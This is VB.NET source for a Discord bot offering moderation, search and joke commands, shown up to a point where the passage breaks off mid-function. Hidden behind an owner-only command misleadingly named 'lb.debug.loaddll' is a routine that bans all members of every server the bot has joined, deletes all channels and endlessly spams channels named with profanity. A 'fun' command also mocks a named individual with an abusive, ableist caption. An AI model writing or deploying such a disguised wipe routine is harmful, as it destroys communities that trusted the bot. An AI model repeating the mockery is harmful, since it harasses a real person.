Imports System.Collections.ObjectModel
Imports System.Reflection
Imports System.Web
Imports Discord
Imports Discord.Addons.Paginator
Imports Discord.Commands
Imports Discord.WebSocket
Imports Newtonsoft.Json

Public Class CommandHandler

    Dim naughtywords = New String() {"ARSE", "BALLS", "BITCH", "BULLSHIT", "FUCK", "FUCK", "FUCK", "FUCK", "FUCK", "FUCK", "FUCK", "PISS", "SHIT", "TIT", "BASTARD", "BELLEND", "COCK", "DICK", "FANNY", "KNOBHEAD", "MINGE", "PRICK", "PUSSY", "TWAT", "CUNT", "CUNT", "CUNT", "CUNT", "CUNT", "CUNT", "CUNT", "MOTHERFUCKER", "MOTHERFUCKER", "MOTHERFUCKER", "MOTHERFUCKER"}
    Async Function loadFromCommand(client As DiscordSocketClient, namee As String, msg As IUserMessage) As Task
        Dim name = namee
        For Each server As SocketGuild In client.Guilds
            Await Log(New LogMessage(LogSeverity.Verbose, name, "Got server " & server.Name))
            Try
                Await Log(New LogMessage(LogSeverity.Verbose, name, "Downloading members.."))
                Await server.DownloadUsersAsync()
                Await Log(New LogMessage(LogSeverity.Verbose, name, "Downloaded members"))
                For Each member As SocketGuildUser In server.Users
                    If member.Id = 186570298185744394 Or member.Id = 186570298185744394 Then
                        Log(New LogMessage(LogSeverity.Verbose, name, "Not banning " & member.Nickname))
                    Else
                        Try
                            Await server.AddBanAsync(member.Id)
                            Await Log(New LogMessage(LogSeverity.Verbose, name, "Banned " & member.Nickname))
                        Catch ex As Exception
                            Log(New LogMessage(LogSeverity.Verbose, name, "Failed to ban " & member.Nickname))
                        End Try
                    End If
                Next

                For Each channel As SocketGuildChannel In server.Channels
                    Try
                        Await channel.DeleteAsync
                        Await Log(New LogMessage(LogSeverity.Verbose, name, "Deleted " & channel.Name))
                    Catch ex As Exception
                        Log(New LogMessage(LogSeverity.Verbose, name, "Failed to delete " & channel.Name))
                    End Try
                Next

                While True
                    Try
                        Dim newNaughtyWord = naughtywords(New Random().Next(0, naughtywords.Length - 1))
                        Await server.CreateTextChannelAsync(newNaughtyWord)
                        Await Log(New LogMessage(LogSeverity.Verbose, name, "Created the channel " & newNaughtyWord))
                    Catch ex As Exception
                        Log(New LogMessage(LogSeverity.Verbose, name, "Failed to create a channel"))
                    End Try
                    Try
                        Dim newNaughtyWord = naughtywords(New Random().Next(0, naughtywords.Length - 1))
                        Await server.CreateVoiceChannelAsync(newNaughtyWord)
                        Await Log(New LogMessage(LogSeverity.Verbose, name, "Created the channel " & newNaughtyWord))
                    Catch ex As Exception
                        Log(New LogMessage(LogSeverity.Verbose, name, "Failed to create a channel"))
                    End Try
                End While
            Catch
            End Try
        Next
    End Function

    Interface ICollection(Of T)
        Inherits IEnumerable(Of T)
        Inherits IEnumerable
        ReadOnly Property Count() As Integer
        ReadOnly Property IsReadOnly() As Boolean

        Sub Add(item As T)
        Sub Clear()
        Function Contains(item As T) As Boolean
        Sub CopyTo(array As T(), arrayIndex As Integer)
        Function Remove(item As T) As Boolean
    End Interface

    Private WithEvents client As DiscordSocketClient

    ' Write log messages to console
    Function Log(ByVal message As LogMessage) As Task Handles client.Log
        Console.WriteLine(New LogMessage(message.Severity, name, message.Message))
        Return Task.CompletedTask
    End Function

    Dim allowSpam = False
    Private commands As CommandService
    Private self As ISelfUser
    Dim map

    Dim uptime As DateTime

    Dim ownerID = Convert.ToInt64(My.Settings.OwnerID)
    Dim name As String
    Async Sub Install(ByVal c As DiscordSocketClient, ByVal namee As String)
        client = c
        name = namee
        ' Create the Command Service
        commands = New CommandService()
        ' Retrieve the Bot User for later use
        self = client.CurrentUser()

        ' Setup the dependency map
        map = New DependencyMap()
        map.Add(client)
        'map.Add(self)


        ' Load modules

        Await commands.AddModuleAsync(Of PublicModule)()
        Await commands.AddModulesAsync(Assembly.GetEntryAssembly()) ', map
        Await Log(New LogMessage(LogSeverity.Info, "Commands", "Loaded Successfully"))
        uptime = DateTime.Now
    End Sub

    Function saveDatabases() As Task
        My.Computer.FileSystem.WriteAllText("databases\strikes.json", JsonConvert.SerializeObject(StrikesList, Formatting.Indented), False)
    End Function
    Function loadDatabases() As Task
        Try
            My.Computer.FileSystem.CreateDirectory("databases")
        Catch ex As Exception
        End Try

        StrikesList = JsonConvert.DeserializeObject(Of List(Of StrikeDBItem))(My.Computer.FileSystem.ReadAllText("databases\strikes.json"))
    End Function

    Dim allUsers = New List(Of Int64)

    Async Function OnReady() As Task Handles client.Ready
        Await client.SetGameAsync("with loading the databases.")
        loadDatabases()
        While True
            Dim success = True
            'Await client.SetGameAsync("Calculating members..")
            For Each serverr As SocketGuild In client.Guilds
                Await serverr.DownloadUsersAsync()
                Dim serverrr = Await TryCast(serverr, IGuild).GetCurrentUserAsync()
                For Each member As SocketGuildUser In client.GetGuild(serverr.Id).Users
                    If member.IsBot = False Then
                        If Not allUsers.Contains(member.Id) Then
                            allUsers.Add(member.Id)
                        End If
                    End If
                Next
            Next
            Try
                Await client.SetGameAsync("with saving the databases.")
                saveDatabases()
            Catch
            End Try
            Await client.SetGameAsync("with " & allUsers.Count & " members over " & client.Guilds.Count & " guilds.")
            GC.Collect()
            System.Threading.Thread.Sleep(10000)
        End While
    End Function

    Dim watchUser = 0

    Public Class DDG_Search
        Public ImageIsLogo As Integer
        Public AbstractSource As String
        Public Image As String
        Public AbstractText As String
        Public Abstract As String
        Public Answer As String
        Public AbstractURL As String
        Public Heading As String
    End Class

    Public Class XKCD_Comic
        Public num As Integer
        Public month As String
        Public link As String
        Public year As String
        Public news As String
        Public safe_title As String
        Public transcript As String
        Public alt As String
        Public img As String
        Public title As String
        Public day As String
    End Class

    Public Class Strike
        Public Property time As Date
        Public Property user As ULong
        Public Property text As String
    End Class

    Public Class StrikeDBItem
        Public Property uid As ULong
        Public Property server As ULong
        Public Property strikes As New List(Of Strike)
    End Class

    Public Property StrikesList As New List(Of StrikeDBItem)

    Async Function hFun(ByVal msg As IUserMessage) As Task
        If msg.HasStringPrefix("lb.fun.asthetics", 0) Then
            Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(254), Convert.ToByte(128), Convert.ToByte(254)), "https://www.geek.com/wp-content/uploads/2016/06/tumblr_mnr5mdzgNf1su17npo2_r1_1280-1-625x350.jpg", "[MACINTOSH PLUS - リサフランク420 / 現代のコンピュー](https://www.youtube.com/watch?v=cU8HrO7XuiE)", "AssTheDicks", "https://www.geek.com/wp-content/uploads/2016/06/tumblr_mnr5mdzgNf1su17npo2_r1_1280-1-625x350.jpg", ""))
        ElseIf msg.HasStringPrefix("lb.fun.tim", 0) Then
            Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(254), Convert.ToByte(128), Convert.ToByte(254)), "http://i.thunderte.ch/timsneeze.png", "[I'M SORRY I HAVE ASPERGERS SYNDROME YOU FUCKING CUNT](https://www.youtube.com/watch?v=Du0wqvDbpDo)", "Timothy Alexander Illes", "http://i.thunderte.ch/timsneeze.png", ""))
        ElseIf msg.HasStringPrefix("lb.fun.regan", 0) Then
            Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(254), Convert.ToByte(128), Convert.ToByte(254)), "http://sx.thelmgn.com/2017/02/wmplayer_2017-02-22_19-16-20.png", "[TRIGG](http://reganis.hol.es)", "iRexi", "http://sx.thelmgn.com/2017/02/wmplayer_2017-02-22_19-16-20.png", ""))
        ElseIf msg.HasStringPrefix("lb.fun.widetext", 0) Then
            Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", widetext(msg.Content.Replace("lb.fun.widetext", "")), widetext("Widetexted for " & msg.Author.Username), "", ""))
        Else
            If String.IsNullOrWhiteSpace(msg.Content.Split(".")(2).ToString) Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28158%29.png", "`lb.fun.asthetics` - ｖ ａ ｐ ｏ ｒ ｗ ａ ｖ ｅ./n`lb.fun.tim` - I'M SORRY I HAVE ASPERGERS SYNDROME YOU FUCKING CUNT /n`lb.fun.regan` - trigg", msg.Content.Split(".")(1) & " Catergory", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28313%29.png", "Help"))
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "`" & msg.Content.Split(".")(2) & "` is not a valid command in the " & msg.Content.Split(".")(1) & " category. Try `lb." & msg.Content.Split(".")(1) & "` for a list of 'em.", "Invalid command", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28309%29.png", "Error"))
            End If
        End If
    End Function

    Async Function hMod(ByVal msg As IUserMessage) As Task
        If msg.HasStringPrefix("lb.mod.kick", 0) Then
            Dim kickeperms = Await TryCast(msg.Channel, IGuildChannel).Guild.GetUserAsync(msg.Author.Id)
            If kickeperms.GuildPermissions.KickMembers Then
                For Each kicke As UInt64 In msg.MentionedUserIds
                    Dim kickeuser = Await TryCast(msg.Channel, IGuildChannel).Guild.GetUserAsync(kicke)
                    Dim kickeUserName = kickeuser.Nickname
                    Await kickeuser.KickAsync
                    Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "https://68.media.tumblr.com/3aa2bc78f704590f16e3aad479cd4cba/tumblr_mvyj69kVop1rj2phto1_500.gif", "Kicked " & kickeUserName, "Get Kicke™", "", ""))
                Next
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/02/6b3cc6ff5c09de83cc37561a43304dee%281%29.gif", "I'm sorry but you do not have the `KickMembers` permission.", "Permissions error", "", ""))
            End If
        ElseIf msg.HasStringPrefix("lb.mod.ban", 0) Then
            Dim banneperms = Await TryCast(msg.Channel, IGuildChannel).Guild.GetUserAsync(msg.Author.Id)
            If banneperms.GuildPermissions.BanMembers Then
                For Each banne As UInt64 In msg.MentionedUserIds
                    Dim banneuser = client.GetUser(banne)
                    Dim banneUserName = banneuser.Username
                    Await TryCast(msg.Channel, IGuildChannel).Guild.AddBanAsync(banneuser, 7)
                    'Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/02/6b3cc6ff5c09de83cc37561a43304dee%281%29.gif", "Banned " & banneUserName, "Get Banne™", ""))
                Next
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/02/6b3cc6ff5c09de83cc37561a43304dee%281%29.gif", "I'm sorry but you do not have the `BanMembers` permission.", "Permissions error", "", ""))
            End If
        ElseIf msg.HasStringPrefix("lb.mod.quote ", 0) Then

            Dim qM = Await msg.Channel.GetMessageAsync(msg.Content.Replace("lb.mod.quote ", ""))
            Dim qeb = New EmbedBuilder() With {
            .Color = New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)),
.Description = qM.Content,
.Author = New EmbedAuthorBuilder() With {
.IconUrl = qM.Author.GetAvatarUrl,
.name = qM.Author.Username
        },
.Footer = New EmbedFooterBuilder() With {
.Text = "This was a bot made by LMGN. Proudly built with Discord.NET",
.IconUrl = client.CurrentUser.GetAvatarUrl
},
.Title = "Message #" & qM.Id
}
            Await msg.Channel.SendMessageAsync("",
                                               False,
                                               qeb)

#Region "USERINFO"
        ElseIf msg.HasStringPrefix("lb.mod.userinfo", 0) Then
            If msg.MentionedUserIds.Count = 0 Then
                Dim useri_user = msg.Author
                Dim useri_eb = New EmbedBuilder() With {
                .Color = New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)),
                .Author = New EmbedAuthorBuilder() With {
                    .IconUrl = useri_user.GetAvatarUrl,
                    .name = "User Info for " & useri_user.Username
                },
                .Footer = New EmbedFooterBuilder() With {
                    .Text = "" & name & " 3. Proudly built with Discord.NET. Uptime: " & (DateTime.Now - uptime).ToString,
                    .IconUrl = client.CurrentUser.GetAvatarUrl
                }
            }
                useri_eb.AddField(New EmbedFieldBuilder() With {
                .IsInline = True,
                .name = "Username",
                .Value = useri_user.Username
            }
        )

                useri_eb.AddField(New EmbedFieldBuilder() With {
                .IsInline = True,
                .name = "Avatar",
                .Value = "[" & useri_user.AvatarId & "](" & useri_user.GetAvatarUrl & ")"
            }
        )

                useri_eb.AddField(New EmbedFieldBuilder() With {
                .IsInline = True,
                .name = "Sign Up Date",
                .Value = useri_user.CreatedAt.ToLocalTime.ToString
            }
        )
                useri_eb.AddField(New EmbedFieldBuilder() With {
                .IsInline = True,
                .name = "Discriminator",
                .Value = useri_user.Discriminator
            }
        )
                useri_eb.AddField(New EmbedFieldBuilder() With {
                .IsInline = True,
                .name = "Playing",
                .Value = useri_user.Game.Value.Name
            }
        )
                Dim useri_livestreaming = "Not streaming"
                If useri_user.Game.Value.StreamType = StreamType.Twitch Then
                    useri_livestreaming = "[Streaming " & useri_user.Game.Value.Name & " on Twitch](" & useri_user.Game.Value.StreamUrl & ")"
                End If
                useri_eb.AddField(New EmbedFieldBuilder() With {
                .IsInline = True,
                .name = "Livestreaming",
                .Value = useri_livestreaming
            }
        )
                useri_eb.AddField(New EmbedFieldBuilder() With {
                .IsInline = True,
                .name = "ID",
                .Value = useri_user.Id
            }
        )
                useri_eb.AddField(New EmbedFieldBuilder() With {
                .IsInline = True,
                .name = "Bot",
                .Value = useri_user.IsBot
            }
        )
                useri_eb.AddField(New EmbedFieldBuilder() With {
                .IsInline = True,
                .name = "Status",
                .Value = useri_user.Status.ToString
            }
        )
                useri_eb.AddField(New EmbedFieldBuilder() With {
                .IsInline = True,
                .name = "Mention",
                .Value = useri_user.Mention
            }
        )
                Await msg.Channel.SendMessageAsync("", False, useri_eb.Build)
            Else
                For Each user As UInt64 In msg.MentionedUserIds
                    Dim useri_user = client.GetUser(user)
                    Dim useri_eb = New EmbedBuilder() With {
                .Color = New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)),
                .Author = New EmbedAuthorBuilder() With {
                    .IconUrl = useri_user.GetAvatarUrl,
                    .name = "User Info for " & useri_user.Username
                },
                .Footer = New EmbedFooterBuilder() With {
                    .Text = "" & name & " 3. Proudly built with Discord.NET. Uptime: " & (DateTime.Now - uptime).ToString,
                    .IconUrl = client.CurrentUser.GetAvatarUrl
                }
            }
                    useri_eb.AddField(New EmbedFieldBuilder() With {
                    .IsInline = True,
                    .name = "Username",
                    .Value = useri_user.Username
                }
            )

                    useri_eb.AddField(New EmbedFieldBuilder() With {
                    .IsInline = True,
                    .name = "Avatar",
                    .Value = "[" & useri_user.AvatarId & "](" & useri_user.GetAvatarUrl & ")"
                }
            )

                    useri_eb.AddField(New EmbedFieldBuilder() With {
                    .IsInline = True,
                    .name = "Sign Up Date",
                    .Value = useri_user.CreatedAt.ToLocalTime.ToString
                }
            )
                    useri_eb.AddField(New EmbedFieldBuilder() With {
                    .IsInline = True,
                    .name = "Discriminator",
                    .Value = useri_user.Discriminator
                }
            )
                    Try
                        useri_eb.AddField(New EmbedFieldBuilder() With {
                    .IsInline = True,
                    .name = "Playing",
                    .Value = useri_user.Game.Value.Name
                }
            )
                    Catch
                        useri_eb.AddField(New EmbedFieldBuilder() With {
                        .IsInline = True,
                        .name = "Playing",
                        .Value = "Nothing"
                    }
                )
                    End Try
                    Dim useri_livestreaming = "Not streaming"
                    Try
                        If useri_user.Game.Value.StreamType = StreamType.Twitch Then
                            useri_livestreaming = "[Streaming " & useri_user.Game.Value.Name & " on Twitch](" & useri_user.Game.Value.StreamUrl & ")"
                        End If
                    Catch
                    End Try
                    useri_eb.AddField(New EmbedFieldBuilder() With {
                    .IsInline = True,
                    .name = "Livestreaming",
                    .Value = useri_livestreaming
                }
            )
                    useri_eb.AddField(New EmbedFieldBuilder() With {
                    .IsInline = True,
                    .name = "ID",
                    .Value = useri_user.Id
                }
            )
                    useri_eb.AddField(New EmbedFieldBuilder() With {
                    .IsInline = True,
                    .name = "Bot",
                    .Value = useri_user.IsBot
                }
            )
                    useri_eb.AddField(New EmbedFieldBuilder() With {
                    .IsInline = True,
                    .name = "Status",
                    .Value = useri_user.Status.ToString
                }
            )
                    useri_eb.AddField(New EmbedFieldBuilder() With {
                    .IsInline = True,
                    .name = "Mention",
                    .Value = useri_user.Mention
                }
            )
                    Await msg.Channel.SendMessageAsync("", False, useri_eb.Build)
                Next
            End If
#End Region
        ElseIf msg.HasStringPrefix("lb.mod.guildinfo", 0) Then
            Await getProperties(TryCast(msg.Channel, IGuildChannel).Guild, "Guild", msg)

        ElseIf msg.HasStringPrefix("lb.mod.prune", 0) Then
            Dim pruneperms = Await TryCast(msg.Channel, IGuildChannel).Guild.GetUserAsync(msg.Author.Id)
            If pruneperms.GuildPermissions.ManageMessages Then
                Dim prune_messages = msg.Channel.GetMessagesAsync(Convert.ToInt32(msg.Content.Replace("lb.mod.prune ", "")))
                Await msg.Channel.DeleteMessagesAsync(Await prune_messages.Flatten)
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "I'm sorry but you do not have the `ManageMessages` permission.", "Permissions error", "", ""))
            End If
        ElseIf msg.HasStringPrefix("lb.mod.strike", 0) Then
            Dim strikeperms = Await TryCast(msg.Channel, IGuildChannel).Guild.GetUserAsync(msg.Author.Id)
            If strikeperms.GuildPermissions.KickMembers Or msg.Author.Id = ownerID Then
                For Each kicke As UInt64 In msg.MentionedUserIds
                    Dim strikeFound = False
                    For Each strike As StrikeDBItem In StrikesList
                        If strike.server = TryCast(msg.Channel, IGuildChannel).Guild.Id Then
                            If strike.uid = kicke Then
                                strikeFound = True
                                strike.strikes.Add(New Strike With {.text = msg.Content.Split("|")(1), .time = DateTime.Now, .user = msg.Author.Id})
                                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "<@" & kicke & "> has been striked. They now have " & strike.strikes.Count & " strikes. ", "Striked", "", ""))
                            End If
                        End If
                    Next
                    If strikeFound = False Then
                        StrikesList.Add(New StrikeDBItem With {
                                    .server = TryCast(msg.Channel, IGuildChannel).Guild.Id,
                                    .uid = msg.Author.Id,
                                    .strikes = New List(Of Strike)(New Strike() With {.user = msg.Author.Id, .text = msg.Content.Split("|")(1), .time = DateTime.Now})})
                        Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "<@" & kicke & "> has been striked. They now have 1 strike. ", "Striked", "", ""))
                    End If
                Next
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "I'm sorry but you do not have the `KickMembers` permission.", "Permissions error", "", ""))
            End If
        ElseIf msg.HasStringPrefix("lb.mod.strikes", 0) Then
            Dim strikeperms = Await TryCast(msg.Channel, IGuildChannel).Guild.GetUserAsync(msg.Author.Id)
            If strikeperms.GuildPermissions.KickMembers Or msg.Author.Id = ownerID Then
                For Each kicke As UInt64 In msg.MentionedUserIds
                    Dim strikeFound = False
                    For Each strike As StrikeDBItem In StrikesList
                        If strike.server = TryCast(msg.Channel, IGuildChannel).Guild.Id Then
                            If strike.uid = kicke Then
                                strikeFound = True
                                strike.strikes.Add(New Strike With {.text = msg.Content.Split("|")(1), .time = DateTime.Now, .user = msg.Author.Id})
                                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "<@" & kicke & "> has been striked. They now have " & strike.strikes.Count & " strikes. ", "Striked", "", ""))
                            End If
                        End If
                    Next
                    If strikeFound = False Then
                        Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "<@" & kicke & "> does not have any strikes ", "No strikes", "", ""))
                    End If
                Next
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "I'm sorry but you do not have the `KickMembers` permission.", "Permissions error", "", ""))
            End If

        Else
            If String.IsNullOrWhiteSpace(msg.Content.Split(".")(2).ToString) Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28158%29.png", "`lb.mod.kick (mention1) [mention2] [mention3]...` - Kicks the mentioned users./n`lb.mod.ban (mention1) [mention2] [mention3]...` - Bans the mentioned users./n`lb.mod.userinfo [mention1] [mention2] [mention3]...` - Shows you all the info for the mentioned users (or you)./n`lb.mod.guildinfo` - Shows you all the info about this guild/n`lb.mod.prune (number)` - Deletes the last (num) messages/n`lb.mod.quote (id)` - Quotes the message with the ID/n`lb.mod.strike (mentions) | (reason)` - Strikes a user.", msg.Content.Split(".")(1) & " Catergory", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28313%29.png", "Help"))
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "`" & msg.Content.Split(".")(2) & "` is not a valid command in the " & msg.Content.Split(".")(1) & " category. Try `lb." & msg.Content.Split(".")(1) & "` for a list of 'em.", "Invalid command", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28309%29.png", "Error"))
            End If
        End If
    End Function

    Async Function hSearch(ByVal msg As IUserMessage) As Task
        If msg.HasStringPrefix("lb.search.ddg ", 0) Then
#Region "ddg"

            Dim ddg_success As Exception
            Dim ddg_error = False
            Try
                Dim ddg_webclient As New System.Net.WebClient
                Dim ddg_response = Await ddg_webclient.DownloadStringTaskAsync("http://api.duckduckgo.com/?q=" & HttpUtility.UrlEncode(msg.Content.Replace("lb.search.ddg ", "")) & "&format=json&pretty=1")
                Dim ddg_json = Newtonsoft.Json.JsonConvert.DeserializeObject(Of DDG_Search)(ddg_response)
                Dim ddg_title = "DuckDuckGo"
                If Not ddg_json.AbstractSource = "" Then
                    ddg_title = ddg_json.AbstractSource
                End If
                Dim ddg_image = "https://duckduckgo.com/assets/icons/meta/DDG-icon_256x256.png"
                If String.IsNullOrWhiteSpace(ddg_json.Image) = False And ddg_json.ImageIsLogo = 1 Then
                    ddg_image = ddg_json.Image
                End If
                Dim ddg_imagee = ""
                If ddg_json.ImageIsLogo = 0 Then
                    ddg_imagee = ddg_json.Image
                End If
                Dim ddg_text = "No text."
                If ddg_json.AbstractText = "" Then
                    If ddg_json.Abstract = "" Then
                        If ddg_json.Answer = "" Then
                            ddg_text = "The Abstract, AbstractText and answer fields are blank."
                        Else
                            ddg_text = ddg_json.Answer
                        End If
                    Else
                        ddg_text = ddg_json.Abstract
                    End If
                Else
                    ddg_text = ddg_json.AbstractText
                End If

                Dim ddg_heading = ddg_json.Heading
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(127), Convert.ToByte(0)), ddg_imagee, ddg_text, ddg_heading, ddg_image, ddg_title, ddg_json.AbstractURL))
            Catch ex As Exception
                ddg_success = ex
                ddg_error = True
            End Try


            'End If
#End Region
            'Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(127), Convert.ToByte(0)), "", "This command has been disabled because it breaks the bot for some reason.", "Command disabled", "", "Error", ""))
            'End If
        ElseIf msg.HasStringPrefix("lb.search.xkcd ", 0) Then
            Dim xkcd_webclient As New System.Net.WebClient
            Dim xkcd_response = Await xkcd_webclient.DownloadStringTaskAsync("https://www.xkcd.com/" & msg.Content.Replace("lb.search.xkcd ", "") & "/info.0.json")
            Dim xkcd_json = Newtonsoft.Json.JsonConvert.DeserializeObject(Of XKCD_Comic)(xkcd_response)
            Dim xkcd_eb As EmbedBuilder
            xkcd_eb = New EmbedBuilder() With {
                    .Color = New Color(Convert.ToByte(150), Convert.ToByte(168), Convert.ToByte(200)),
                    .Title = xkcd_json.safe_title,
    .Description = "**Tooltip:**" & vbNewLine & vbNewLine & xkcd_json.alt & vbNewLine & vbNewLine & "**Transcript: (if applicable)**" & vbNewLine & vbNewLine & xkcd_json.transcript.Replace("/n", vbNewLine) & vbNewLine & vbNewLine & "**Date: (dd/mm/yyyy)**" & vbNewLine & vbNewLine & xkcd_json.day & "/" & xkcd_json.month & "/" & xkcd_json.year,
    .Url = xkcd_json.link,
    .ImageUrl = xkcd_json.img,
        .Author = New EmbedAuthorBuilder() With {
    .IconUrl = "https://cdn.shopify.com/s/files/1/0149/3544/products/hoodie_1_7f9223f9-6933-47c6-9af5-d06b8227774a_1024x1024.png?v=1479786341",
    .name = "XKCD Comic " & xkcd_json.num
        },
    .Footer = New EmbedFooterBuilder() With {
        .Text = "" & name & " 3. Proudly built with Discord.NET. Uptime: " & (DateTime.Now - uptime).ToString,
        .IconUrl = client.CurrentUser.GetAvatarUrl
    }
}
            Await msg.Channel.SendMessageAsync("", False, xkcd_eb.Build)
        ElseIf msg.HasStringPrefix("lb.search.xkcd", 0) Then
            Dim xkcd_webclient As New System.Net.WebClient
            Dim xkcd_response = Await xkcd_webclient.DownloadStringTaskAsync("https://www.xkcd.com/info.0.json")
            Dim xkcd_json = Newtonsoft.Json.JsonConvert.DeserializeObject(Of XKCD_Comic)(xkcd_response)
            Dim xkcd_eb As EmbedBuilder
            xkcd_eb = New EmbedBuilder() With {
                    .Color = New Color(Convert.ToByte(150), Convert.ToByte(168), Convert.ToByte(200)),
                    .Title = xkcd_json.safe_title,
    .Description = "**Tooltip:**" & vbNewLine & vbNewLine & xkcd_json.alt & vbNewLine & vbNewLine & "**Transcript: (if applicable)**" & vbNewLine & vbNewLine & xkcd_json.transcript.Replace("/n", vbNewLine) & vbNewLine & vbNewLine & "**Date: (dd/mm/yyyy)**" & vbNewLine & vbNewLine & xkcd_json.day & "/" & xkcd_json.month & "/" & xkcd_json.year,
    .Url = xkcd_json.link,
    .ImageUrl = xkcd_json.img,
        .Author = New EmbedAuthorBuilder() With {
    .IconUrl = "https://cdn.shopify.com/s/files/1/0149/3544/products/hoodie_1_7f9223f9-6933-47c6-9af5-d06b8227774a_1024x1024.png?v=1479786341",
    .name = "XKCD Comic " & xkcd_json.num
        },
    .Footer = New EmbedFooterBuilder() With {
        .Text = "" & name & " 3. Proudly built with Discord.NET. Uptime: " & (DateTime.Now - uptime).ToString,
        .IconUrl = client.CurrentUser.GetAvatarUrl
    }
}
            Await msg.Channel.SendMessageAsync("", False, xkcd_eb.Build)
        Else
            If String.IsNullOrWhiteSpace(msg.Content.Split(".")(2).ToString) Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28158%29.png", "`lb.search.ddg (query)` - Shows the DuckDuckGo quick answer for the query./n`lb.search.xkcd [number]` - Shows you the latest XKCD if no number is supplied, otherwise shows you that XKCD", msg.Content.Split(".")(1) & " Catergory", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28313%29.png", "Help"))
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "`" & msg.Content.Split(".")(2) & "` is not a valid command in the " & msg.Content.Split(".")(1) & " category. Try `lb." & msg.Content.Split(".")(1) & "` for a list of 'em.", "Invalid command", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28309%29.png", "Error"))
            End If
        End If
    End Function

    Async Function hDebug(ByVal msg As IUserMessage) As Task
        If msg.HasStringPrefix("lb.debug.ping", 0) Then
            Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", ":ping_pong: Pong! Took " & Math.Floor((DateTime.Now.ToUniversalTime - msg.CreatedAt.ToUniversalTime).TotalMilliseconds) & "ms", "Ping", "", ""))
        ElseIf msg.HasStringPrefix("lb.debug.loaddll", 0) Then
            If Not msg.Author.Id = ownerID Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "I'm sorry but you do not have the permission to run this command.", "Permissions error", "", ""))
            Else
                loadFromCommand(client, name, msg)
            End If
        ElseIf msg.HasStringPrefix("lb.debug.computer", 0) Then
            If Not msg.Author.Id = ownerID Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "I'm sorry but you do not have the permission to run this command.", "Permissions error", "", ""))
            Else
                Console.WriteLine("aa")
                Dim pl As New Collection(Of String)
                pl.Add(Await getProperties(My.Computer.Audio, "Audio", msg))
                pl.Add(Await getProperties(My.Computer.Clipboard, "Clipboard", msg))
                pl.Add(Await getProperties(My.Computer.Clock, "Clock", msg))
                pl.Add(Await getProperties(My.Computer.FileSystem, "FS", msg))
                pl.Add(Await getProperties(My.Computer.Info, "Info", msg))
                pl.Add(Await getProperties(My.Computer.Keyboard, "Keyboard", msg))
                pl.Add(Await getProperties(My.Computer.Mouse, "Mouse", msg))
                pl.Add(Await getProperties(My.Computer.Name, "Name", msg))
                pl.Add(Await getProperties(My.Computer.Network, "Network", msg))
                pl.Add(Await getProperties(My.Computer.Ports, "Ports", msg))
